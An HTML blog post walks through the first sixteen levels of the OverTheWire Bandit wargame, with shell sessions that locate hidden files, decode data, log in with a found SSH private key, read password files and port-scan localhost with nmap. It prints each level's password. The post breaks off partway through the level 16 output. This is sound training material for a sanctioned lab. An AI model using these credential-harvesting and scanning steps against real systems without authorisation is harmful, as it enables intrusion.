<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bandit</title>
    <meta name="description" content="Over The Wire walkthrough series">
    <link rel="stylesheet" href="/css/index.css">
    <link rel="stylesheet" href="/css/prism-base16-monokai.dark.css">
    <link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="Risky Hacker">
    <link rel="alternate" href="/feed/feed.json" type="application/json" title="Risky Hacker">
  </head>
  <body>
    <header>
      <h1 class="home"><a href="/">Risky Hacker</a></h1>
      <ul class="nav">
        <li class="nav-item"><a href="/">Home</a></li>
        <li class="nav-item"><a href="/posts/">Archive</a></li>
        <li class="nav-item"><a href="/about/">About</a></li>
      </ul>
    </header>

    <main class="tmpl-post">
      <h1>Bandit</h1>

<blockquote>
<p>An Over The Wire wargame.</p>
</blockquote>
<h3 id="getting-into-otw">Getting into OTW <a class="direct-link" href="#getting-into-otw">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># SSH into OTW on port `2220`</span><br><ins class="highlight-line highlight-line-add">ssh bandit0@bandit.labs.overthewire.org -p 2220</ins></code></pre>
<h3 id="level-0">Level 0 <a class="direct-link" href="#level-0">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: print file to standard out </span><br><span class="highlight-line">bandit0@bandit:~$ ls</span><br><span class="highlight-line">readme</span><br><ins class="highlight-line highlight-line-add">bandit0@bandit:~$ cat readme</ins><br><span class="highlight-line">boJ9jbbUNNfktd78OOpsqOltutMc3MY1</span><br><span class="highlight-line">bandit0@bandit:~$</span></code></pre>
<h3 id="level-1">Level 1 <a class="direct-link" href="#level-1">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: print reserved-name file to standard out</span><br><span class="highlight-line">bandit1@bandit:~$ ls</span><br><span class="highlight-line">-</span><br><ins class="highlight-line highlight-line-add">bandit1@bandit:~$ cat ./-</ins><br><span class="highlight-line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br><span class="highlight-line">bandit1@bandit:~$</span></code></pre>
<h3 id="level-2">Level 2 <a class="direct-link" href="#level-2">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: print filename with spaces to standard out </span><br><span class="highlight-line">bandit2@bandit:~$ ls</span><br><span class="highlight-line">spaces in this filename</span><br><ins class="highlight-line highlight-line-add">bandit2@bandit:~$ cat spaces\ in\ this\ filename</ins><br><span class="highlight-line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span></code></pre>
<h3 id="level-3">Level 3 <a class="direct-link" href="#level-3">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: list hidden files</span><br><span class="highlight-line">bandit3@bandit:~$ ls</span><br><span class="highlight-line">inhere</span><br><span class="highlight-line">bandit3@bandit:~$ ls inhere/</span><br><span class="highlight-line">bandit3@bandit:~$ ls -a inhere/</span><br><span class="highlight-line">.  ..  .hidden</span><br><ins class="highlight-line highlight-line-add">bandit3@bandit:~$ cat inhere/.hidden</ins><br><span class="highlight-line">pIwrPrtPN36QITSp3EQaw936yaFoFgAB</span><br><span class="highlight-line">bandit3@bandit:~$</span></code></pre>
<h3 id="level-4">Level 4 <a class="direct-link" href="#level-4">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Find only human-readable files</span><br><span class="highlight-line">bandit4@bandit:~$ ls</span><br><span class="highlight-line">inhere</span><br><span class="highlight-line">bandit4@bandit:~$ ls inhere/</span><br><span class="highlight-line">-file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09</span><br><ins class="highlight-line highlight-line-add">bandit4@bandit:~$ cat $(find inhere/ -type f | xargs -n 1 file | grep ASCII | cut -d ':' -f1)</ins><br><span class="highlight-line">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</span><br><span class="highlight-line">bandit4@bandit:~$</span></code></pre>
<h3 id="level-5">Level 5 <a class="direct-link" href="#level-5">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Find the only human-readable files 1033 bytes in size and not executable</span><br><span class="highlight-line">bandit5@bandit:~$ ls</span><br><span class="highlight-line">inhere</span><br><span class="highlight-line">bandit5@bandit:~$ ls inhere/</span><br><span class="highlight-line">maybehere00  maybehere02  maybehere04  maybehere06  maybehere08  maybehere10  maybehere12  maybehere14  maybehere16  maybehere18</span><br><span class="highlight-line">maybehere01  maybehere03  maybehere05  maybehere07  maybehere09  maybehere11  maybehere13  maybehere15  maybehere17  maybehere19</span><br><ins class="highlight-line highlight-line-add">bandit5@bandit:~$ ls inhere/*</ins><br><span class="highlight-line">inhere/maybehere00:</span><br><span class="highlight-line">-file1  -file2  -file3  spaces file1  spaces file2  spaces file3</span><br><span class="highlight-line"></span><br><span class="highlight-line">inhere/maybehere01:</span><br><span class="highlight-line">-file1  -file2  -file3  spaces file1  spaces file2  spaces file3</span><br><span class="highlight-line"></span><br><span class="highlight-line">...</span><br><span class="highlight-line"></span><br><span class="highlight-line">inhere/maybehere18:</span><br><span class="highlight-line">-file1  -file2  -file3  spaces file1  spaces file2  spaces file3</span><br><span class="highlight-line"></span><br><span class="highlight-line">inhere/maybehere19:</span><br><span class="highlight-line">-file1  -file2  -file3  spaces file1  spaces file2  spaces file3</span><br><ins class="highlight-line highlight-line-add">bandit5@bandit:~$ cat $(find inhere -type f ! -executable -size 1033c | xargs -n 1 file | grep 'ASCII' | cut -d ':' -f1)</ins><br><span class="highlight-line">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</span></code></pre>
<h3 id="level-6">Level 6 <a class="direct-link" href="#level-6">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Find the only file owned by user bandit7 owned by group bandit6 that is 33 bytes in size</span><br><span class="highlight-line"># Key insight: ignore files you do not have permission to access</span><br><span class="highlight-line">bandit6@bandit:~$ ls</span><br><span class="highlight-line">bandit6@bandit:~$ ls -la</span><br><span class="highlight-line">total 20</span><br><span class="highlight-line">drwxr-xr-x  2 root root 4096 May  7 20:14 .</span><br><span class="highlight-line">drwxr-xr-x 41 root root 4096 May  7 20:14 ..</span><br><span class="highlight-line">-rw-r--r--  1 root root  220 May 15  2017 .bash_logout</span><br><span class="highlight-line">-rw-r--r--  1 root root 3526 May 15  2017 .bashrc</span><br><span class="highlight-line">-rw-r--r--  1 root root  675 May 15  2017 .profile</span><br><span class="highlight-line">bandit6@bandit:~$ ls ..</span><br><span class="highlight-line">bandit0   bandit12  bandit16  bandit2   bandit23  bandit27      bandit29      bandit30-git  bandit33  bandit7</span><br><span class="highlight-line">bandit1   bandit13  bandit17  bandit20  bandit24  bandit27-git  bandit29-git  bandit31      bandit4   bandit8</span><br><span class="highlight-line">bandit10  bandit14  bandit18  bandit21  bandit25  bandit28      bandit3       bandit31-git  bandit5   bandit9</span><br><span class="highlight-line">bandit11  bandit15  bandit19  bandit22  bandit26  bandit28-git  bandit30      bandit32      bandit6</span><br><span class="highlight-line">bandit6@bandit:~$ ls ../..</span><br><span class="highlight-line">bin   cgroup2  etc   initrd.img      lib    lib64   lost+found  mnt  proc        root  sbin   srv  tmp  var      vmlinuz.old</span><br><span class="highlight-line">boot  dev      home  initrd.img.old  lib32  libx32  media       opt  README.txt  run   share  sys  usr  vmlinuz</span><br><span class="highlight-line">bandit6@bandit:~$ ls ../../../</span><br><span class="highlight-line">bin   cgroup2  etc   initrd.img      lib    lib64   lost+found  mnt  proc        root  sbin   srv  tmp  var      vmlinuz.old</span><br><span class="highlight-line">boot  dev      home  initrd.img.old  lib32  libx32  media       opt  README.txt  run   share  sys  usr  vmlinuz</span><br><span class="highlight-line">bandit6@bandit:~$ find ../../ -type f -group bandit6 -user bandit7 -size 33c 2>/dev/null</span><br><span class="highlight-line">../../var/lib/dpkg/info/bandit7.password</span><br><ins class="highlight-line highlight-line-add">bandit6@bandit:~$ cat $(!!)</ins><br><ins class="highlight-line highlight-line-add">cat $(find ../../ -type f -group bandit6 -user bandit7 -size 33c 2>/dev/null)</ins><br><span class="highlight-line">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</span><br><span class="highlight-line">bandit6@bandit:~$</span><br><span class="highlight-line"></span></code></pre>
<h3 id="level-7">Level 7 <a class="direct-link" href="#level-7">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: parse a file for desired keyword</span><br><span class="highlight-line">bandit7@bandit:~$ ls</span><br><span class="highlight-line">data.txt</span><br><span class="highlight-line">bandit7@bandit:~$ du -h data.txt</span><br><span class="highlight-line">4.0M    data.txt</span><br><span class="highlight-line">bandit7@bandit:~$ wc data.txt</span><br><span class="highlight-line">  98567  197133 4184396 data.txt</span><br><span class="highlight-line">bandit7@bandit:~$ grep "millionth" data.txt</span><br><span class="highlight-line">millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV</span><br><ins class="highlight-line highlight-line-add">bandit7@bandit:~$ echo $(grep "millionth" data.txt ) | cut -d ' ' -f2</ins><br><span class="highlight-line">cvX2JJa4CFALtqS87jk27qwqGhBM9plV</span><br><span class="highlight-line">bandit7@bandit:~$</span></code></pre>
<h3 id="level-8">Level 8 <a class="direct-link" href="#level-8">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: parse a file for unique occurences</span><br><span class="highlight-line">bandit8@bandit:~$ ls</span><br><span class="highlight-line">data.txt</span><br><span class="highlight-line">bandit8@bandit:~$ du -h data.txt</span><br><span class="highlight-line">36K     data.txt</span><br><span class="highlight-line">bandit8@bandit:~$ wc data.txt</span><br><span class="highlight-line">1001  1001 33033 data.txt</span><br><ins class="highlight-line highlight-line-add">bandit8@bandit:~$ sort data.txt | uniq -c | grep -E '\ 1\ ' | awk '{print $2}'</ins><br><span class="highlight-line">UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</span><br><span class="highlight-line">bandit8@bandit:~$</span></code></pre>
<h3 id="level-9">Level 9 <a class="direct-link" href="#level-9">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: parse a file for human readable strings</span><br><span class="highlight-line">bandit9@bandit:~$ ls</span><br><span class="highlight-line">data.txt</span><br><span class="highlight-line">bandit9@bandit:~$ ls data.txt</span><br><span class="highlight-line">data.txt</span><br><span class="highlight-line">bandit9@bandit:~$ file data.txt</span><br><span class="highlight-line">data.txt: data</span><br><span class="highlight-line">bandit9@bandit:~$ head -1024c data.txt</span><br><span class="highlight-line">Llω;ßOܛǤXNdT$x7@D@o+DBM֢Z/,_w#5</span><br><span class="highlight-line">...</span><br><ins class="highlight-line highlight-line-add">bandit9@bandit:~$ strings data.txt | grep -E '[=]{2,}.*'</ins><br><span class="highlight-line">========== the*2i"4</span><br><span class="highlight-line">========== password</span><br><span class="highlight-line">Z)========== is</span><br><span class="highlight-line">&========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span><br><span class="highlight-line">bandit9@bandit:~$ strings data.txt | grep -E '&[=]{2,}.*'</span><br><span class="highlight-line">&========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span><br><ins class="highlight-line highlight-line-add">bandit9@bandit:~$ strings data.txt | grep -E '&[=]{2,}.*' | awk '{print $2}'</ins><br><span class="highlight-line">truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span><br><span class="highlight-line">bandit9@bandit:~$</span></code></pre>
<h3 id="level-10">Level 10 <a class="direct-link" href="#level-10">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: decode base64 data</span><br><span class="highlight-line">bandit10@bandit:~$ ls</span><br><span class="highlight-line">data.txt</span><br><span class="highlight-line">bandit10@bandit:~$ file data.txt</span><br><span class="highlight-line">data.txt: ASCII shell/</span><br><span class="highlight-line">bandit10@bandit:~$ head data.txt</span><br><span class="highlight-line">VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==</span><br><span class="highlight-line">bandit10@bandit:~$ base64 --decode data.txt</span><br><span class="highlight-line">The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</span><br><span class="highlight-line">bandit10@bandit:~$ echo $(!!) | awk '{ print $4}'</span><br><ins class="highlight-line highlight-line-add">echo $(base64 --decode data.txt ) | awk '{ print $4}'</ins><br><span class="highlight-line">IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</span><br><span class="highlight-line">bandit10@bandit:~$</span></code></pre>
<h3 id="level-11">Level 11 <a class="direct-link" href="#level-11">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: rotate plaintext </span><br><span class="highlight-line">bandit11@bandit:~$ ls</span><br><span class="highlight-line">data.txt</span><br><span class="highlight-line">bandit11@bandit:~$ head data.txt</span><br><span class="highlight-line">Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh</span><br><span class="highlight-line">bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'</span><br><span class="highlight-line">The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</span><br><ins class="highlight-line highlight-line-add">bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | awk '{print $4}'</ins><br><span class="highlight-line">5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</span><br><span class="highlight-line">bandit11@bandit:~$</span></code></pre>
<h3 id="level-12">Level 12 <a class="direct-link" href="#level-12">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: decode repeatedly compressed hexdump</span><br><span class="highlight-line">bandit12@bandit:~$ ls</span><br><span class="highlight-line">data.txt</span><br><span class="highlight-line">bandit12@bandit:~$ file data.txt</span><br><span class="highlight-line">data.txt: ASCII shell/</span><br><span class="highlight-line">bandit12@bandit:~$ head data.txt</span><br><span class="highlight-line">00000000: 1f8b 0808 0650 b45e 0203 6461 7461 322e  .....P.^..data2.</span><br><span class="highlight-line">00000010: 6269 6e00 013d 02c2 fd42 5a68 3931 4159  bin..=...BZh91AY</span><br><span class="highlight-line">00000020: 2653 598e 4f1c c800 001e 7fff fbf9 7fda  &SY.O...........</span><br><span class="highlight-line">00000030: 9e7f 4f76 9fcf fe7d 3fff f67d abde 5e9f  ..Ov...}?..}..^.</span><br><span class="highlight-line">00000040: f3fe 9fbf f6f1 feee bfdf a3ff b001 3b1b  ..............;.</span><br><span class="highlight-line">00000050: 5481 a1a0 1ea0 1a34 d0d0 001a 68d3 4683  T......4....h.F.</span><br><span class="highlight-line">00000060: 4680 0680 0034 1918 4c4d 190c 4000 0001  F....4..LM..@...</span><br><span class="highlight-line">00000070: a000 c87a 81a3 464d a8d3 43c5 1068 0346  ...z..FM..C..h.F</span><br><span class="highlight-line">00000080: 8343 40d0 3400 0340 66a6 8068 0cd4 f500  .C@.4..@f..h....</span><br><span class="highlight-line">00000090: 69ea 6800 0f50 68f2 4d00 680d 06ca 0190  i.h..Ph.M.h.....</span><br><span class="highlight-line">bandit12@bandit:~$ xxd -r data.txt | file -</span><br><span class="highlight-line">/dev/stdin: gzip compressed data, was "data2.bin", last modified: Thu May  7 18:14:30 2020, max compression, from Unix</span><br><span class="highlight-line">bandit12@bandit:~$ xxd -r data.txt | gunzip | file -</span><br><span class="highlight-line">/dev/stdin: bzip2 compressed data, block size = 900k</span><br><span class="highlight-line">bandit12@bandit:~$ xxd -r data.txt | gunzip | bunzip2 | file -</span><br><span class="highlight-line">/dev/stdin: gzip compressed data, was "data4.bin", last modified: Thu May  7 18:14:30 2020, max compression, from Unix</span><br><span class="highlight-line">bandit12@bandit:~$ xxd -r data.txt | gunzip | bunzip2 | gunzip | file -</span><br><span class="highlight-line">/dev/stdin: POSIX tar archive (GNU)</span><br><span class="highlight-line">bandit12@bandit:~$ xxd -r data.txt | gunzip | bunzip2 | gunzip | tar -xO | file -</span><br><span class="highlight-line">/dev/stdin: POSIX tar archive (GNU)</span><br><span class="highlight-line">bandit12@bandit:~$ xxd -r data.txt | gunzip | bunzip2 | gunzip | tar -xO | tar -xO | file -</span><br><span class="highlight-line">/dev/stdin: bzip2 compressed data, block size = 900k</span><br><span class="highlight-line">bandit12@bandit:~$ xxd -r data.txt | gunzip | bunzip2 | gunzip | tar -xO | tar -xO | bunzip2 | file -</span><br><span class="highlight-line">/dev/stdin: POSIX tar archive (GNU)</span><br><span class="highlight-line">bandit12@bandit:~$ xxd -r data.txt | gunzip | bunzip2 | gunzip | tar -xO | tar -xO | bunzip2 | tar -xO | file -</span><br><span class="highlight-line">/dev/stdin: gzip compressed data, was "data9.bin", last modified: Thu May  7 18:14:30 2020, max compression, from Unix</span><br><span class="highlight-line">bandit12@bandit:~$ xxd -r data.txt | gunzip | bunzip2 | gunzip | tar -xO | tar -xO | bunzip2 | tar -xO | gunzip | file -</span><br><span class="highlight-line">/dev/stdin: ASCII shell/</span><br><ins class="highlight-line highlight-line-add">bandit12@bandit:~$ xxd -r data.txt | gunzip | bunzip2 | gunzip | tar -xO | tar -xO | bunzip2 | tar -xO | gunzip | awk '{print $4}'</ins><br><span class="highlight-line">8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</span><br><span class="highlight-line">bandit12@bandit:~$</span></code></pre>
<h3 id="level-13">Level 13 <a class="direct-link" href="#level-13">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: use a private ssh key to read a file</span><br><span class="highlight-line">bandit13@bandit:~$ ls</span><br><span class="highlight-line">sshkey.private</span><br><ins class="highlight-line highlight-line-add">bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost</ins><br><span class="highlight-line">bandit14@bandit:~$ cat /etc/bandit\_pass/bandit14</span><br><span class="highlight-line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br><span class="highlight-line">bandit14@bandit:~$</span></code></pre>
<h3 id="level-14-15">Level 14-15 <a class="direct-link" href="#level-14-15">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: transmit data through a port on localhost</span><br><ins class="highlight-line highlight-line-add">bandit14@bandit:~$ nc localhost 30000 <<< '4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e'</ins><br><span class="highlight-line">Correct!</span><br><span class="highlight-line">BfMYroe26WYalil77FoDi9qh59eK5xNr</span><br><span class="highlight-line"></span><br><span class="highlight-line">bandit14@bandit:~$</span><br><ins class="highlight-line highlight-line-add">bandit15@bandit:~$ openssl s_client -ign_eof -connect localhost:30001 <<< "BfMYroe26WYalil77FoDi9qh59eK5xNr"</ins><br><span class="highlight-line">CONNECTED(00000003)</span><br><span class="highlight-line">depth=0 CN = localhost</span><br><span class="highlight-line">verify error:num=18:self signed certificate</span><br><span class="highlight-line">verify return:1</span><br><span class="highlight-line">depth=0 CN = localhost</span><br><span class="highlight-line">verify return:1</span><br><span class="highlight-line">Certificate chain</span><br><span class="highlight-line">0 s:/CN=localhost</span><br><span class="highlight-line">i:/CN=localhost</span><br><span class="highlight-line">Server certificate</span><br><span class="highlight-line">-----BEGIN CERTIFICATE-----</span><br><span class="highlight-line">MIICBjCCAW+gAwIBAgIEDU18oTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="highlight-line">b2NhbGhvc3QwHhcNMjAwNTA3MTgxNTQzWhcNMjEwNTA3MTgxNTQzWjAUMRIwEAYD</span><br><span class="highlight-line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAK3CPNFR</span><br><span class="highlight-line">FEypcqUa8NslmIMWl9xq53Cwhs/fvYHAvauyfE3uDVyyX79Z34Tkot6YflAoufnS</span><br><span class="highlight-line">+puh2Kgq7aDaF+xhE+FPcz1JE0C2bflGfEtx4l3qy79SRpLiZ7eio8NPasvduG5e</span><br><span class="highlight-line">pkuHefwI4c7GS6Y7OTz/6IpxqXBzv3c+x93TAgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="highlight-line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="highlight-line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="highlight-line">DQEBBQUAA4GBAC9uy1rF2U/OSBXbQJYuPuzT5mYwcjEEV0XwyiX1MFZbKUlyFZUw</span><br><span class="highlight-line">rq+P1HfFp+BSODtk6tHM9bTz+p2OJRXuELG0ly8+Nf/hO/mYS1i5Ekzv4PL9hO8q</span><br><span class="highlight-line">PfmDXTHs23Tc7ctLqPRj4/4qxw6RF4SM+uxkAuHgT/NDW1LphxkJlKGn</span><br><span class="highlight-line">-----END CERTIFICATE-----</span><br><span class="highlight-line">subject=/CN=localhost</span><br><span class="highlight-line">issuer=/CN=localhost</span><br><span class="highlight-line">No client certificate CA names sent</span><br><span class="highlight-line">Peer signing digest: SHA512</span><br><span class="highlight-line">Server Temp Key: X25519, 253 bits</span><br><span class="highlight-line"></span><br><span class="highlight-line">SSL handshake has read 1019 bytes and written 269 bytes</span><br><span class="highlight-line">Verification error: self signed certificate</span><br><span class="highlight-line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="highlight-line">Server public key is 1024 bit</span><br><span class="highlight-line">Secure Renegotiation IS supported</span><br><span class="highlight-line">Compression: NONE</span><br><span class="highlight-line">Expansion: NONE</span><br><span class="highlight-line">No ALPN negotiated</span><br><span class="highlight-line">SSL-Session:</span><br><span class="highlight-line">    Protocol  : TLSv1.2</span><br><span class="highlight-line">    Cipher    : ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="highlight-line">    Session-ID: A13E23D3F5EF2EAE12971CA9723AE9DA6DFA471036CA068A9BF2BEC40C7204B9</span><br><span class="highlight-line">    Session-ID-ctx:</span><br><span class="highlight-line">    Master-Key: BA6403AC3F4D7D538D391211AA0BA5FE0EE9349E42BDD5C8D64E7CBE12E5A8B42A3E54B456BADF8508AB57BFD39AD02B</span><br><span class="highlight-line">    PSK identity: None</span><br><span class="highlight-line">    PSK identity hint: None</span><br><span class="highlight-line">    SRP username: None</span><br><span class="highlight-line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="highlight-line">    TLS session ticket:</span><br><span class="highlight-line">    0000 - aa 02 e6 3a 2e 0b c8 5d-6f 54 4a 1b 5a e0 2c 0e   ...:...]oTJ.Z.,.</span><br><span class="highlight-line">    0010 - 19 75 44 d7 13 60 84 9f-93 a0 48 e0 07 ed 93 e0   .uD..`....H.....</span><br><span class="highlight-line">    0020 - de 67 fe 08 43 4d 2f 01-f5 8c 29 87 58 72 bf e6   .g..CM/...).Xr..</span><br><span class="highlight-line">    0030 - ea 74 61 29 d2 fc 7b 74-4f 06 13 5c be 4f 0f a8   .ta)..{tO..\.O..</span><br><span class="highlight-line">    0040 - 0f c8 47 ae 3f 0d 64 15-c5 2d 21 30 8b 25 80 ab   ..G.?.d..-!0.%..</span><br><span class="highlight-line">    0050 - 87 0b 3b 67 44 ba 9d 0a-08 5a 88 7d e0 1f 29 5f   ..;gD....Z.}..)_</span><br><span class="highlight-line">    0060 - 74 c2 b3 7f e9 97 21 62-86 d8 98 36 11 cd fa 52   t.....!b...6...R</span><br><span class="highlight-line">    0070 - 11 d6 c8 0d 3b a8 a0 f0-78 10 0e 45 af a0 e6 f9   ....;...x..E....</span><br><span class="highlight-line">    0080 - 10 23 0e 1b 79 f2 16 f4-2a 80 28 45 c9 1b 2b 98   .#..y...*.(E..+.</span><br><span class="highlight-line">    0090 - 00 8d 01 cf b9 59 01 03-6a d5 54 b5 b8 53 8e 5e   .....Y..j.T..S.^</span><br><span class="highlight-line">Start Time: 1598750519</span><br><span class="highlight-line">Timeout   : 7200 (sec)</span><br><span class="highlight-line">Verify return code: 18 (self signed certificate)</span><br><span class="highlight-line">Extended master secret: yes</span><br><span class="highlight-line">Correct!</span><br><span class="highlight-line">cluFn7wTiGryunymYOu4RcffSxQluehd</span><br><span class="highlight-line">closed</span><br><span class="highlight-line">bandit15@bandit:~$</span></code></pre>
<h3 id="level-16">Level 16 <a class="direct-link" href="#level-16">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Discover open ports and protocol versions, send encrypted message to open port</span><br><ins class="highlight-line highlight-line-add">bandit16@bandit:~$ nmap -vvv -T5 -p 31000-32000 localhost</ins><br><span class="highlight-line"></span><br><span class="highlight-line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-08-30 03:39 CEST</span><br><span class="highlight-line">Initiating Ping Scan at 03:39</span><br><span class="highlight-line">Scanning localhost (127.0.0.1) [2 ports]</span><br><span class="highlight-line">Completed Ping Scan at 03:39, 0.00s elapsed (1 total hosts)</span><br><span class="highlight-line">Initiating Connect Scan at 03:39</span><br><span class="highlight-line">Scanning localhost (127.0.0.1) [1001 ports]</span><br><span class="highlight-line">Discovered open port 31518/tcp on 127.0.0.1</span><br><span class="highlight-line">Discovered open port 31960/tcp on 127.0.0.1</span><br><span class="highlight-line">Discovered open port 31691/tcp on 127.0.0.1</span><br><span class="highlight-line">Discovered open port 31046/tcp on 127.0.0.1</span><br><span class="highlight-line">Discovered open port 31790/tcp on 127.0.0.1</span><br><span class="highlight-line">Completed Connect Scan at 03:39, 0.04s elapsed (1001 total ports)</span><br><span class="highlight-line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="highlight-line">Host is up, received conn-refused (0.00024s latency).</span><br><span class="highlight-line">Scanned at 2020-08-30 03:39:31 CEST for 0s</span><br><span class="highlight-line">Not shown: 996 closed ports</span><br><span class="highlight-line">Reason: 996 conn-refused</span><br><span class="highlight-line">PORT      STATE SERVICE REASON</span><br><ins class="highlight-line highlight-line-add">31046/tcp open  unknown syn-ack</ins><br><ins class="highlight-line highlight-line-add">31518/tcp open  unknown syn-ack</ins><br><ins class="highlight-line highlight-line-add">31691/tcp open  unknown syn-ack</ins><br><ins class="highlight-line highlight-line-add">31790/tcp open  unknown syn-ack</ins><br><ins class="highlight-line highlight-line-add">31960/tcp open  unknown syn-ack</ins><br><span class="highlight-line"></span><br><span class="highlight-line">Read data files from: /usr/bin/../share/nmap</span><br><span class="highlight-line">Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds</span><br><ins class="highlight-line highlight-line-add">bandit16@bandit:~$ nmap -vvv -T5 -sV -p 31046,31518,31691,31790,31960 localhost</ins><br><span class="highlight-line"></span><br><span class="highlight-line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-08-30 03:40 CEST</span><br><span class="highlight-line">NSE: Loaded 40 scripts for scanning.</span><br><span class="highlight-line">Initiating Ping Scan at 03:40</span><br><span class="highlight-line">Scanning localhost (127.0.0.1) [2 ports]</span><br><span class="highlight-line">Completed Ping Scan at 03:40, 0.00s elapsed (1 total hosts)</span><br><span class="highlight-line">Initiating Connect Scan at 03:40</span><br><span class="highlight-line">Scanning localhost (127.0.0.1) [5 ports]</span><br><span class="highlight-line">Discovered open port 31046/tcp on 127.0.0.1</span><br><span class="highlight-line">Discovered open port 31518/tcp on 127.0.0.1</span><br><span class="highlight-line">Discovered open port 31960/tcp on 127.0.0.1</span><br><span class="highlight-line">Discovered open port 31691/tcp on 127.0.0.1</span><br><span class="highlight-line">Discovered open port 31790/tcp on 127.0.0.1</span><br><span class="highlight-line">Completed Connect Scan at 03:40, 0.00s elapsed (5 total ports)</span><br><span class="highlight-line">Initiating Service scan at 03:40</span><br><span class="highlight-line">Scanning 5 services on localhost (127.0.0.1)</span><br><span class="highlight-line">Service scan Timing: About 20.00% done; ETC: 03:43 (0:02:44 remaining)</span><br><span class="highlight-line">ompleted Service scan at 03:41, 89.43s elapsed (5 services on 1 host)</span><br><span class="highlight-line">NSE: Script scanning 127.0.0.1.</span><br><span class="highlight-line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="highlight-line">Initiating NSE at 03:41</span><br><span class="highlight-line">Completed NSE at 03:41, 0.02s elapsed</span><br><span class="highlight-line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="highlight-line">Initiating NSE at 03:41</span><br><span class="highlight-line">Completed NSE at 03:41, 0.01s elapsed</span><br><span class="highlight-line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="highlight-line">Host is up, received conn-refused (0.00055s latency).</span><br><span class="highlight-line">Scanned at 2020-08-30 03:40:26 CEST for 89s</span><br><span class="highlight-line">PORT      STATE SERVICE     REASON  VERSION</span><br><ins class="highlight-line highlight-line-add">31046/tcp open  echo        syn-ack</ins><br><ins class="highlight-line highlight-line-add">31518/tcp open  ssl/echo    syn-ack</ins><br><ins class="highlight-line highlight-line-add">31691/tcp open  echo        syn-ack</ins><br><ins class="highlight-line highlight-line-add">31790/tcp open  ssl/unknown syn-ack</ins><br><ins class="highlight-line highlight-line-add">31960/tcp open  echo        syn-ack</ins><br><span class="highlight-line">bandit16@bandit:~$</span><br><ins class="highlight-line highlight-line-add">bandit16@bandit:~$ openssl s_client -ign_eof -connect localhost:31790 <<< cluFn7wTiGryunymYOu4RcffSxQluehd</ins><br><span class="highlight-line">CONNECTED(00000003)</span><br><span class="highlight-line">depth=0 CN = localhost</span><br><span class="highlight-line">verify error:num=18:self signed certificate</span><br><span class="highlight-line">verify return:1</span><br><span class="highlight-line">depth=0 CN = localhost</span><br><span class="highlight-line">verify return:1</span><br><span class="highlight-line">Certificate chain</span><br><span class="highlight-line">0 s:/CN=localhost</span><br><span class="highlight-line">i:/CN=localhost</span><br><span class="highlight-line">Server certificate</span><br><span class="highlight-line">-----BEGIN CERTIFICATE-----</span><br><span 